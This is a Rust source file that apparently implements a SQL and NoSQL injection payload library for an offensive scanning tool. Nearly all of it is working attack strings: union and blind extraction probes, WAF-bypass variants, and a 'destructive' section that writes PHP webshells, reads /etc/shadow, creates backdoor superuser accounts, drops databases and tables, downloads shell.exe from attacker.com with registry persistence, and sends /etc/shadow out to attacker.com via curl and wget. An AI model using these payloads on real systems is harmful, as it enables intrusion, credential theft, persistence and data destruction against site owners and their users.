/// SQL injection payload library — error-based, union, boolean, time, OOB, NoSQL.
pub struct SqlInjection;

impl SqlInjection {
    // ── Error-based detection ─────────────────────────────────────────────────

    pub fn get_error_payloads() -> Vec<String> {
        vec![
            // Quote triggers
            "'".to_string(),
            "''".to_string(),
            "\"".to_string(),
            "`".to_string(),
            // Boolean tautologies
            "' OR '1'='1".to_string(),
            "' OR '1'='1'--".to_string(),
            "' OR '1'='1'#".to_string(),
            "' OR 1=1--".to_string(),
            "' OR 1=1#".to_string(),
            "1 OR 1=1".to_string(),
            // Boolean contradictions (for differential detection)
            "' AND '1'='2".to_string(),
            "' AND 1=2--".to_string(),
            "1 AND 1=2".to_string(),
            // Column count probing
            "' ORDER BY 1--".to_string(),
            "' ORDER BY 10--".to_string(),
            "' ORDER BY 100--".to_string(),
            // Error-based extraction (MySQL)
            "' AND extractvalue(1,concat(0x7e,(SELECT version())))--".to_string(),
            "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--".to_string(),
            // Error-based extraction (MSSQL)
            "' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--".to_string(),
            // Error-based extraction (PostgreSQL)
            "' AND 1=cast((SELECT version()) as int)--".to_string(),
        ]
    }

    // ── UNION-based ───────────────────────────────────────────────────────────

    pub fn get_union_payloads() -> Vec<String> {
        vec![
            // Column count discovery
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--".to_string(),
            // Data extraction
            "' UNION SELECT user(),NULL--".to_string(),
            "' UNION SELECT @@version,NULL--".to_string(),
            "' UNION SELECT database(),NULL--".to_string(),
            "' UNION SELECT table_name,NULL FROM information_schema.tables--".to_string(),
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--".to_string(),
            "' UNION SELECT username,password FROM users--".to_string(),
            // PostgreSQL
            "' UNION SELECT version(),NULL--".to_string(),
            "' UNION SELECT current_user,NULL--".to_string(),
            // MSSQL
            "' UNION SELECT @@version,NULL--".to_string(),
            "' UNION SELECT SYSTEM_USER,NULL--".to_string(),
            // Oracle
            "' UNION SELECT banner,NULL FROM v$version--".to_string(),
            "' UNION SELECT user,NULL FROM dual--".to_string(),
        ]
    }

    // ── Time-based blind ──────────────────────────────────────────────────────

    pub fn get_time_payloads() -> Vec<String> {
        vec![
            // MySQL
            "' AND SLEEP(5)--".to_string(),
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
            "' AND (SELECT SLEEP(5))--".to_string(),
            "1; SELECT SLEEP(5)--".to_string(),
            // MSSQL
            "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "1; WAITFOR DELAY '0:0:5'--".to_string(),
            // PostgreSQL
            "'; SELECT pg_sleep(5)--".to_string(),
            "1; SELECT pg_sleep(5)--".to_string(),
            // Oracle
            "' AND 1=dbms_pipe.receive_message('a',5)--".to_string(),
            // SQLite
            "' AND 1=randomblob(500000000)--".to_string(),
            // Benchmark (MySQL, no sleep needed)
            "' AND BENCHMARK(50000000,MD5('x'))--".to_string(),
        ]
    }

    // ── Boolean-based blind ───────────────────────────────────────────────────

    pub fn get_boolean_payloads() -> Vec<(String, String)> {
        vec![
            ("' AND '1'='1".to_string(), "' AND '1'='2".to_string()),
            ("' AND 1=1--".to_string(),  "' AND 1=2--".to_string()),
            ("1 AND 1=1".to_string(),    "1 AND 1=2".to_string()),
            // Substring extraction (MySQL)
            ("' AND SUBSTRING(@@version,1,1)='5'--".to_string(),
             "' AND SUBSTRING(@@version,1,1)='9'--".to_string()),
            // Substring extraction (PostgreSQL)
            ("' AND SUBSTRING(version(),1,1)='P'--".to_string(),
             "' AND SUBSTRING(version(),1,1)='X'--".to_string()),
        ]
    }

    // ── Stacked queries ───────────────────────────────────────────────────────

    pub fn get_stacked_payloads() -> Vec<String> {
        vec![
            // MSSQL — xp_cmdshell
            "'; EXEC xp_cmdshell('whoami')--".to_string(),
            "'; EXEC xp_cmdshell('net user')--".to_string(),
            // MSSQL — enable xp_cmdshell
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
            // PostgreSQL — COPY FROM PROGRAM (RCE)
            "'; COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--".to_string(),
            "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'--".to_string(),
            // MySQL — INTO OUTFILE (write webshell)
            "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--".to_string(),
        ]
    }

    // ── WAF bypass variants ───────────────────────────────────────────────────

    pub fn get_waf_bypass_payloads() -> Vec<String> {
        vec![
            // Comment-based space bypass
            "'/**/OR/**/1=1--".to_string(),
            "'/*!OR*/1=1--".to_string(),
            // Case variation
            "' oR '1'='1".to_string(),
            "' Or 1=1--".to_string(),
            // URL encoding
            "%27%20OR%201%3D1--".to_string(),
            // Double URL encoding
            "%2527%2520OR%25201%253D1--".to_string(),
            // Whitespace alternatives
            "'\tor\t'1'='1".to_string(),
            "'\nor\n'1'='1".to_string(),
            // Inline comment
            "'/*!50000OR*/1=1--".to_string(),
            // Scientific notation
            "' OR 1e0=1e0--".to_string(),
            // Hex string
            "' OR 0x31=0x31--".to_string(),
        ]
    }

    // ── NoSQL injection ───────────────────────────────────────────────────────

    /// MongoDB / NoSQL injection payloads.
    pub fn get_nosql_payloads() -> Vec<String> {
        vec![
            // MongoDB operator injection (JSON body)
            "{\"$gt\": \"\"}".to_string(),
            "{\"$ne\": null}".to_string(),
            "{\"$regex\": \".*\"}".to_string(),
            "{\"$where\": \"1==1\"}".to_string(),
            // URL parameter injection
            "[$ne]=1".to_string(),
            "[$gt]=".to_string(),
            "[$regex]=.*".to_string(),
            // JavaScript injection via $where
            "'; return true; var x='".to_string(),
            "'; return this.password.match(/.*/) //".to_string(),
            // Array injection
            "[]".to_string(),
            "[0]=1".to_string(),
        ]
    }

    // ── Destructive / real-world attack payloads ──────────────────────────────

    /// Real attack payloads that professional red teams use for exploitation.
    /// Includes RCE, webshell deployment, data exfiltration, privilege escalation.
    pub fn get_destructive_payloads() -> Vec<String> {
        vec![
            // ── MySQL: INTO OUTFILE webshells (Linux) ──
            "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/oxide.php'--".to_string(),
            "' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/shell.php'--".to_string(),
            "' UNION SELECT \"<?php system($_GET[0]);?>\" INTO OUTFILE '/var/www/html/oxide.php'--".to_string(),
            // ── MySQL: INTO DUMPFILE binary webshell ──
            "' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b305d293b3f3e INTO DUMPFILE '/var/www/html/oxide.php'--".to_string(),
            // ── MySQL: LOAD_FILE sensitive files ──
            "' UNION SELECT LOAD_FILE('/etc/shadow'),NULL--".to_string(),
            "' UNION SELECT LOAD_FILE('/etc/passwd'),LOAD_FILE('/etc/shadow')--".to_string(),
            "' UNION SELECT LOAD_FILE('/var/log/auth.log'),NULL--".to_string(),
            // ── MySQL: Bulk table dump to file ──
            "' SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--".to_string(),
            "' SELECT * FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt'--".to_string(),
            // ── MySQL: Create user / grant privs ──
            "'; CREATE USER oxide@'%' IDENTIFIED BY 'Pwn3d!123'; GRANT ALL PRIVILEGES ON *.* TO oxide@'%'; FLUSH PRIVILEGES--".to_string(),
            // ── MySQL: Drop database ──
            "'; DROP DATABASE IF EXISTS (SELECT database())--".to_string(),
            // ── MSSQL: xp_cmdshell full RCE ──
            "'; EXEC xp_cmdshell 'powershell -enc aB3AGgAbwBhAG0AaQ=='--".to_string(),
            "'; EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\\shell.exe'--".to_string(),
            "'; EXEC xp_cmdshell 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v oxide /t REG_SZ /d C:\\shell.exe'--".to_string(),
            // ── MSSQL: xp_regread registry read ──
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Control\\Terminal Server', 'fDenyTSConnections'--".to_string(),
            "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SAM\\SAM\\Domains\\Account\\Users\\Names', 'Administrator'--".to_string(),
            // ── MSSQL: OPENROWSET linked server ──
            "'; SELECT * FROM OPENROWSET('SQLNCLI', 'Server=target;Trusted_Connection=yes;', 'SELECT @@version')--".to_string(),
            // ── MSSQL: sp_addlogin priv esc ──
            "'; EXEC sp_addlogin 'oxide', 'Pwn3d!123', 'master'--".to_string(),
            "'; EXEC sp_addsrvrolemember 'oxide', 'sysadmin'--".to_string(),
            // ── PostgreSQL: COPY TO PROGRAM RCE ──
            "'; COPY (SELECT 'oxide') TO PROGRAM 'curl http://attacker.com/$(whoami)'--".to_string(),
            "'; COPY (SELECT 'oxide') TO PROGRAM 'wget --post-data=$(cat /etc/shadow) http://attacker.com/'--".to_string(),
            // ── PostgreSQL: lo_import/lo_export file read ──
            "'; SELECT lo_import('/etc/shadow')--".to_string(),
            // ── PostgreSQL: CREATE USER with superuser ──
            "'; CREATE USER oxide WITH PASSWORD 'Pwn3d!123' SUPERUSER--".to_string(),
            // ── PostgreSQL: DROP table cascade ──
            "'; DROP TABLE IF EXISTS users CASCADE--".to_string(),
            // ── Oracle: UTL_FILE file write ──
            "' AND 1=(SELECT UTL_FILE.PUT_LINE('/tmp','oxide.php','<?php system($_GET[0]);?>') FROM dual)--".to_string(),
            // ── Oracle: CREATE USER ──
            "' AND 1=(SELECT 1 FROM dual WHERE 1=1); CREATE USER oxide IDENTIFIED BY Pwn3d!123; GRANT DBA TO oxide--".to_string(),
            // ── Generic: Stacked query data exfil ──
            "'; SELECT * FROM users--".to_string(),
            "'; SELECT * FROM credit_cards--".to_string(),
            "'; SELECT * FROM passwords--".to_string(),
            "'; SELECT * FROM admins--".to_string(),
        ]
    }

}
